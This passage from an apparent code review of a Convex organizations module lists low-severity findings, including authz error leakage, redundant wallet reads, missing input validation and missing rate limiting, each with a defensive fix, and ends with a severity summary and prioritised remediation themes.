**Location:** `convex/organizations.ts:133` (`"Organization does not match authenticated identity"`), `151` (`"Failed to load created organization"`), `164` (`"Failed to load updated organization"`).

**Verified.** Convex surfaces mutation error messages to the calling client by default. `"Organization does not match authenticated identity"` reveals *why* the authz check failed (identity/org mismatch) — useful to an attacker probing the auth model. `"Failed to load created/updated organization"` leaks internal state-machine internals. Project contract: "Never leak internal errors."

**Impact (unchanged):** Minor info disclosure; aids reconnaissance of the authz model.

**Fix:** Return a single generic message (`"Unauthorized"` / `"Organization not available"`) for the authz failure; log the detailed reason server-side only. For the post-write read-back failures (internal-only, should never fire), a generic `"Internal error"` is sufficient.

---

### [SEV: P3 — NEW] `upsertFromClerk` redundantly calls `ensureWallet` on every `organization.updated` — read amplification on every rename
**Location:** `convex/organizations.ts:74-84` (`upsertFromClerk` patch path calls `ensureWallet` after `patch`).

```ts
await ctx.db.patch(existing._id, { name: args.name, slug: args.slug, imageUrl: args.imageUrl });
await ensureWallet(ctx, existing._id);   // ← runs on every update, even pure image/slug renames
return existing._id;
```

**Problem:** The patch path (org already exists) unconditionally calls `ensureWallet`, which does a `wallets.by_organization` `.unique()` read every time. For an org that already has a wallet (the invariant once the org was created), this read always returns the existing wallet and the insert branch never fires. So every `organization.updated` event — a slug rename, an image change, a name tweak — pays a wasted index query. Clerk fires `organization.updated` on any org-metadata change; a busy org doing branding iterations can generate meaningful webhook volume.

**Impact:** Wasted Convex read quota on every org-update webhook; no correctness impact. Minor, but it is the same "write amplification" anti-pattern flagged in `reviews/convex.organizations.ts.md` for `ensureOrganization` — here on the webhook path.

**Fix:** Only call `ensureWallet` on the insert path (org just created). On the patch path, the wallet already exists by invariant; skip the call. If defensive coverage is desired, gate it behind a cheap check or a `try { await ensureWallet } catch { /* wallet missing — heal */ }`.

---

### [SEV: P3 — NEW] `ensureWallet` name collides with `wallets.ts:ensureWallet` public mutation — code-search confusion and drift risk
**Location:** `convex/organizations.ts:11-27` (private `async function ensureWallet`); `convex/wallets.ts:301-310` (public `export const ensureWallet = mutation({...})`).

**Problem:** Two different `ensureWallet`s coexist in the convex package. The private one in `organizations.ts` is a read-then-insert helper returning `Id<"wallets">`, called only from `upsertFromClerk`/`ensureOrganization`. The public one in `wallets.ts` is a `mutation` that calls `getOrCreateWallet` (a separate helper with the identical race, per `reviews/convex.wallets.ts.md` P0 #1) and returns a `WalletView`. They have the same name, different signatures, different return types, and different race profiles. A future maintainer searching for `ensureWallet` will find both; a fix to one will not propagate to the other. The wallets reviewer already flagged the logic duplication; this flags the naming collision that makes the duplication actively dangerous.

**Impact:** Drift risk: a fix to the org-creation wallet race in one `ensureWallet` will not propagate to the other. Code-search confusion for any maintainer investigating wallet creation.

**Fix:** Rename the private helper to `ensureWalletForOrg` (or inline it — it is 14 lines called twice). Better: collapse both into a single canonical wallet-creation path in `wallets.ts` and have `organizations.ts` call it, as the wallets review recommends.

---

### [SEV: P3 — NEW] `ensureOrganization` `clerkOrgId` string comparison is untrimmed — whitespace mismatch footgun
**Location:** `convex/organizations.ts:131` (`claims.orgId !== args.clerkOrgId`); args `:125` (`clerkOrgId: v.string()`, no trim).

**Problem:** `args.clerkOrgId` is `v.string()` with no trim or format validation. The authz check is a strict `!==` string comparison against `claims.orgId` (which comes from the JWT, also untrimmed). If a client ever sends a `clerkOrgId` with leading/trailing whitespace (e.g., a copy-paste artifact, or a buggy Clerk client), the check fails and the mutation throws `"Organization does not match authenticated identity"` — a confusing failure that looks like an authz problem but is a data-hygiene problem. Conversely, if the JWT claim ever carries whitespace (unlikely but unvalidated), the check passes spuriously.

**Impact:** Confusing authz failures on whitespace-laden input. No security impact (the strict comparison fails closed). Minor robustness gap.

**Fix:** Trim `args.clerkOrgId` (and ideally validate it matches Clerk's `org_` ID format) before the comparison, or at the validator layer via a custom `v.string()` that trims.

---

### [SEV: P3 — NEW] `upsertFromClerk` accepts empty `name`/`slug` from Clerk — no defense-in-depth validation on the trusted webhook path
**Location:** `convex/organizations.ts:54-86` (args `:55-60`); webhook source `convex/http.ts:60-67`.

**Problem:** `upsertFromClerk`'s args are `name: v.string()`, `slug: v.string()` — any string, including `""`. The webhook is trusted (svix-verified), but Clerk's `organization.created`/`updated` payload shape can drift, and a Clerk API change or a malformed payload could deliver `name: ""` or `slug: ""`. `upsertFromClerk` would write the empty string to the mirror, polluting `by_slug` and rendering a nameless org in the catalogue. There is no defense-in-depth validation on the trusted path.

**Impact:** Empty `name`/`slug` pollute the mirror and break downstream rendering/routing if Clerk's payload ever delivers them. Unlikely but unguarded.

**Fix:** Validate `name`/`slug` are non-empty (and `slug` matches the format regex from P2 #7) in `upsertFromClerk` too, not just in `ensureOrganization`. Defense-in-depth on the trusted path costs nothing.

---

### [SEV: P3 — NEW] `ensureOrganization` has no rate limiting / abuse protection — mutation-quota exhaustion via tight-loop client
**Location:** `convex/organizations.ts:123-167`; called from `apps/web/src/hooks/use-ensure-mirror.ts:42` (client-controlled trigger).

**Problem:** `ensureOrganization` is a public mutation that does a `by_clerk_org` index read + (on existing row) an unconditional `patch` + an `ensureWallet` read (P3 #18) + a `ctx.db.get` read-back — at least 3-4 DB operations per call. A malicious or buggy client can call it in a tight loop (the client-side `useEnsureMirror` guards with `ranFor.current`, but a direct `convex.mutation(api.organizations.ensureOrganization, …)` call from a script bypasses that). Convex's per-deployment mutation quota is bounded; a single authenticated client can exhaust it for the deployment, degrading service for all orgs. The unconditional patch (P2 #5 / P3 #18) amplifies each call into a write, so the loop also generates write load and false "changed" realtime emissions.

**Impact:** A single authenticated client can degrade Convex mutation throughput for the entire deployment. No rate limit, no per-caller backoff. Compounds the write-amplification findings.

**Fix:** Either (a) reduce `ensureOrganization` to a pure get-or-throw that does not write on the common path (P1 #2 fix kills the write amplification and most of the cost), or (b) add a per-`clerkOrgId` cooldown (e.g., refuse to patch if the row was patched within the last N seconds — requires the `updatedAt` field from new P2 #14). Convex does not provide built-in per-caller rate limiting, so the guard must be in-handler.

---

## Summary

| Severity | Prior (verified) | New | Total |
|---|---|---|---|
| P0 | 0 | 0 | 0 |
| P1 | 4 | 1 | 5 |
| P2 | 7 | 4 | 11 |
| P3 | 3 | 4 | 7 |
| **Total** | **14** | **9** | **23** |

**Top 3 to fix first:**

1. **`deleteFromClerk` cascade gap (P1 #1) + hard-delete financial destruction (P2 #10) + resurrection (new P1 #5).** These three form a single failure cluster: deletion is shallow (orphans 13 tables), destructive (zeroes the ledger), and non-final (a stale JWT or late webhook resurrects the org with a zeroed wallet). Fix together: soft-delete the org with a `deletedAt` sentinel, refuse insert when a soft-deleted row exists, cascade-delete (batched, per P2 #6) or soft-delete children, and never hard-delete `wallets`/`walletEntries`. Until this cluster is fixed, org deletion is a financial-data-loss event with no recovery.

2. **`ensureOrganization` trusts client `name`/`slug`/`imageUrl` (P1 #2) + no `updatedAt` field (new P2 #14) + ignores `orgRole` (P2 #9).** The mirror has two writers with no versioning, no recency signal, no role gate, and no input validation. Any member can drift the slug and DoS the whole org; stale JWTs revert webhook renames; the mirror cannot be reconciled because there is no field to compare against. Fix together: drop `name`/`slug`/`imageUrl` from the public-mutation args (derive from JWT or let the webhook own content), add `updatedAt`, require `org:admin` for any content write, validate slug format and `imageUrl` URL shape.

3. **Insert-path race creates duplicate `clerkOrgId` rows (P1 #3) + `ensureWallet` duplicate-wallet throw (P2 #11) + `getBySlug`/`listMine` dead leak surface (new P2 #15).** The read-then-insert pattern against a non-unique index bricks the org for every member on a concurrent first-call; the same race bricks the wallet; and the only public query that exposes the bricked state (`getBySlug`) has no legitimate consumer. Fix together: route all org+wallet creation through a single authoritative `internalMutation` (`upsertFromClerk`), make `ensureOrganization` get-or-throw, add post-insert duplicate reconciliation, and delete the dead `getBySlug`/`listMine` exports.

**Recurring themes:** (a) Convex indexes are treated as unique constraints when they are not — every `.unique()` read is a latent throw on duplicates that the insert paths can create (P1 #3, P2 #7, P2 #11, P2 #15). (b) The mirror has two writers (Clerk webhook + public mutation) with no versioning, no claim-recency guard, no role check, and no `updatedAt` field to reconcile against — last-write-wins drift is structural, not accidental (P1 #2, P2 #5, P2 #9, new P2 #14). (c) Deletion is shallow, destructive, and non-final — only `wallets`/`walletEntries`/the org row are touched, the ledger is hard-deleted without settlement, and stale JWTs/webhooks resurrect the org with a zeroed wallet (P1 #1, P2 #6, P2 #8, P2 #10, new P1 #5). (d) Authz is inconsistent: `requireOrgMemberBySlug` checks membership, `getBySlug` does not and has no caller, `ensureOrganization` ignores `orgRole` (P1 #4, P2 #9, new P2 #15). (e) Input validation is absent on both the trusted webhook path and the untrusted client path — slugs, names, `imageUrl`, `clerkOrgId` are all unvalidated `v.string()` (P2 #7, P1 #2, new P2 #16, new P3 #20, new P3 #21).
